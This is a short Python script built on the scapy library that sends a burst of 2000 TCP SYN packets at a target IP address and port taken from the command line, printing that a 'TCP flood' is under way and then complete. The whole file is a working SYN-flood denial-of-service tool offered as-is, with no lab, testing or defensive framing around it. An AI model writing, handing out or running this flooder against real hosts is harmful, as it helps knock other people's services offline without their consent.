from scapy.all import *
from scapy.layers.inet import TCP, IP


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def tcp_flood(target_ip, target_port):
    print(f"TCP flood for '{target_ip}' on port '{target_port}'")

    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")

    send(syn_packet, inter=0.001, count=2000)
    print("TCP flood is complete!")


def main() -> None:
    if len(sys.argv) != 3:
        print("Usage: %s target port" % (sys.argv[0]))
        sys.exit(0)

    target = str(sys.argv[1])
    port = int(sys.argv[2])

    tcp_flood(target, port)


if __name__ == "__main__":
    main()
